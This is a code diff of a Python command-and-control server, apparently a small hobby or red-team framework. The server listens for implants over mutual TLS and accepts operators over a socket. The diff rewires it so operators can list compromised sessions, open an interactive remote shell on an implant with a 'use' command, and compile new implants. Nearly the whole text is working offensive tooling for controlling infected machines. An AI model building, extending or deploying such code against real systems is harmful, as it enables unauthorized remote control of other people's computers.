@@ -17,20 +17,18 @@ class C2Server(object):
     connections = []
 
     def __init__(self):
-        ## Generating stuff for implant comms ##
-
-        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
-        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
-
-        self.handler = Handler(self.requestq)
-        self.handler.start()
-        print("Listening for implants...")
-        print("Listening for operators...")
-
         self.shutdown = 0
 
+        ## Generating stuff for implant comms ##
+        print("Listening for operators...")
+        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
+        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
+        self.handler = Handler(self.requestq)
+        self.handler.start()
 
-        # operator listener setup
+
+        ## Generating stuff for operator comms ##
+        print("Listening for implants...")
         self.clients = dict()
 
         self.host = ''
@@ -40,27 +38,19 @@ class C2Server(object):
         self.sock.bind((self.host, self.port))
         threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console
 
-
     def serverMain(self):
         while self.shutdown == 0:
-            userin = input("$ ")
-            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-            commandStr = ' '.join(userin)
-            logging.info("Command: " + commandStr)
-            self.executecommand(userin.split())
+            pass
 
-    def executecommand_session(self, session_id, command):
+    def shell_session(self, session_id, client):
             conn, addr = self.implantlistener.sessions.get(session_id) 
-            print(f"Using session with {addr}")
+            client.send((f"Using session with {addr}\n").encode("ascii"))
 
-            return mtls.session(conn, command) # uncomment once operator works 
-
-            '''
-            ###temporary shell -- to be removed once operator works
             while True:
-                userin = input("[session] > ") 
+                userin = client.recv(1024)
 
-                if userin == "exit":
+                if userin == b"exit":
+                   client.send((f"Exiting session {addr}\n").encode("ascii"))
                    break 
 
                 output = mtls.session(conn, userin)
@@ -68,24 +58,26 @@ class C2Server(object):
                 if not output:
                     break
 
-                sys.stdout.buffer.write(output) 
-            '''
+                client.send(output) 
 
-    def executecommand(self, command):
+    def executecommand(self, command, client):
         #command is an array of strings
         if len(command) < 1:
+            client.send(b"Plase enter a command")
             return
 
         elif command[0] == "sessions":
             return str(self.implantlistener.sessions.list()).encode('ascii')
 
         # Interact with a session
-        elif command[0] == "run":
-            if len(command) == 3:
-                response = self.executecommand_session(command[1], command[2]) # TODO change whoami to operator command once it works
-                return response
+        elif command[0] == "use":
+            if command[1] not in self.implantlistener.sessions.list():
+                return (b"Session doesn't exist")
+
+            if len(command) == 2:
+                self.shell_session(command[1], client) 
             else:
-                return(b"Usage: run <session> <cmd>")
+                return(b"Usage: use <session>")
 
         # Compile an implant
         elif command[0] == "generate":
@@ -104,14 +96,10 @@ class C2Server(object):
             id = str(uuid.uuid4())
             self.clients[id] = (client, address)
 
-            print("###### client: ", client)
-            print("###### address: ", address)
-    
 
-            print("\n[+]Connected to a new client at " + address[0] + ":" + str(address[1]) + "\n")
-            #client.settimeout(60)
+            print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
             t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
-            self.connections.append(address) #dont know why to do this, just seems right?
+            self.connections.append(address) 
 
     def listenToClient(self, client, address):
         size = 1024
@@ -119,14 +107,20 @@ class C2Server(object):
             data = client.recv(size)
             if data and (str(data.decode('ascii')).lower() != 'exit'):
                 recvData = str(data.decode('ascii')).lower()
-                print("RECIVED: " + recvData)
 
-                response = self.executecommand(recvData.split())
+                response = self.executecommand(recvData.split(), client)
 
-                client.send(response)
+                logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+                commandStr = ' '.join(recvData)
+                logging.info("Command: " + commandStr)
+
+                if response:
+                    client.send(response)
+
             else:
-                print("[+]Disconnected " + address[0] +":"+ str(address[1]))
-                raise error('Client disconnected')
+                print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
+                client.close()
+                break
 
 
 def main():
